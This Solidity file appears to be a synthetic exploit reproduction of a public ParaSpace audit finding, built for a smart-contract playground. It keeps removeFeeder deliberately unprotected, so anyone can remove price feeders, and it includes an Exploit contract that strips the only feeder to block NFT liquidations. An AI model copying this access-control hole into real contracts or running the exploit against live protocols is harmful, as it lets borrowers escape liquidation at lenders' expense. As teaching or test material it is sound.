// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace - [H-04] Anyone can prevent themselves from being liquidated
    (Code4rena 2022-11-paraspace; #15977, reporter xiaoming90)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: NFTFloorOracle.removeFeeder has onlyWhenFeederExisted but NO
    onlyRole(DEFAULT_ADMIN_ROLE). Anyone can strip all feeders; without keepers
    the floor TWAP cannot be refreshed and liquidateERC721 reverts once stale
    (and immediately in our gate that requires an active feeder set).
    Vulnerable removeFeeder preserved verbatim (@>). */

contract NFTFloorOracle {
    struct FeederPosition {
        bool registered;
        uint8 index;
    }

    struct PriceInformation {
        uint256 twap;
        uint256 updatedAt;
    }

    bytes32 public constant UPDATER_ROLE = keccak256("UPDATER_ROLE");
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    mapping(bytes32 => mapping(address => bool)) private _roles;
    address[] public feeders;
    mapping(address => FeederPosition) private feederPositionMap;
    mapping(address => PriceInformation) public assetPriceMap;
    uint128 public expirationPeriod;
    address public asset;

    constructor(address _asset, address initialFeeder, uint128 _expirationPeriod) {
        asset = _asset;
        expirationPeriod = _expirationPeriod;
        _roles[DEFAULT_ADMIN_ROLE][msg.sender] = true;
        _addFeeder(initialFeeder);
        assetPriceMap[_asset] = PriceInformation({twap: 100 ether, updatedAt: block.number});
    }

    modifier onlyWhenFeederExisted(address _feeder) {
        require(feederPositionMap[_feeder].registered, "feeder not exist");
        _;
    }

    modifier onlyRole(bytes32 role) {
        require(_roles[role][msg.sender], "missing role");
        _;
    }

    function hasRole(bytes32 role, address account) public view returns (bool) {
        return _roles[role][account];
    }

    function feederCount() external view returns (uint256) {
        return feeders.length;
    }

    function _addFeeder(address _feeder) internal {
        feeders.push(_feeder);
        feederPositionMap[_feeder].index = uint8(feeders.length - 1);
        feederPositionMap[_feeder].registered = true;
        _roles[UPDATER_ROLE][_feeder] = true;
    }

    /// @notice Allows owner to remove feeder.
    /// @param _feeder feeder to remove
    function removeFeeder(address _feeder) external onlyWhenFeederExisted(_feeder) {
        _removeFeeder(_feeder); // @> VULN: missing onlyRole(DEFAULT_ADMIN_ROLE) - anyone can strip feeders
        // FIX: onlyRole(DEFAULT_ADMIN_ROLE) on removeFeeder
    }

    function _removeFeeder(address _feeder) internal onlyWhenFeederExisted(_feeder) {
        uint8 feederIndex = feederPositionMap[_feeder].index;
        if (feeders[feederIndex] == _feeder) {
            feeders[feederIndex] = feeders[feeders.length - 1];
            feeders.pop();
        }
        delete feederPositionMap[_feeder];
        _roles[UPDATER_ROLE][_feeder] = false;
    }

    function setPrice(address _asset, uint256 _twap) public onlyRole(UPDATER_ROLE) {
        assetPriceMap[_asset].twap = _twap;
        assetPriceMap[_asset].updatedAt = block.number;
    }

    function getPrice(address _asset) external view returns (uint256 price) {
        uint256 updatedAt = assetPriceMap[_asset].updatedAt;
        require((block.number - updatedAt) <= expirationPeriod, "NFTOracle: asset price expired");
        return assetPriceMap[_asset].twap;
    }
}

/// @dev liquidateERC721 path: needs live feeders to refresh floor TWAP + non-stale getPrice.
contract LiquidationGate {
    NFTFloorOracle public oracle;
    address public nftAsset;
    bool public lastLiquidationOk;

    constructor(NFTFloorOracle _oracle, address _nftAsset) {
        oracle = _oracle;
        nftAsset = _nftAsset;
    }

    function liquidateERC721(address /*borrower*/, uint256 /*tokenId*/) external returns (bool) {
        // Operational: without feeders the TWAP cannot be kept fresh (report impact chain).
        require(oracle.feederCount() > 0, "no feeders - floor price cannot be refreshed");
        uint256 floor = oracle.getPrice(nftAsset);
        require(floor > 0, "zero price");
        lastLiquidationOk = true;
        return true;
    }
}

contract Exploit {
    NFTFloorOracle public oracle; // CREATE 1 - vulnerable
    LiquidationGate public gate; // CREATE 2

    address public constant NFT_ASSET = address(0xBEEF);
    address public constant FEEDER = address(0xFEED);

    constructor() {
        oracle = new NFTFloorOracle(NFT_ASSET, FEEDER, 1800);
        gate = new LiquidationGate(oracle, NFT_ASSET);
    }

    function run() external {
        // Baseline: liquidation works with an active feeder and fresh price.
        require(gate.liquidateERC721(address(0xB0), 1), "baseline liq");
        require(oracle.feederCount() == 1, "feeder present");

        // Attack: non-admin removes the only feeder (missing access control).
        oracle.removeFeeder(FEEDER);

        require(oracle.feederCount() == 0, "feeder not stripped");
        require(!oracle.hasRole(oracle.UPDATER_ROLE(), FEEDER), "role not revoked");

        // Liquidations now revert - positions cannot be closed.
        (bool ok,) = address(gate).call(
            abi.encodeWithSelector(LiquidationGate.liquidateERC721.selector, address(0xB0), 1)
        );
        require(!ok, "liquidation should be blocked");
        require(oracle.feederCount() == 0, "harm: feeders empty - NFT liquidations DoS");
    }
}
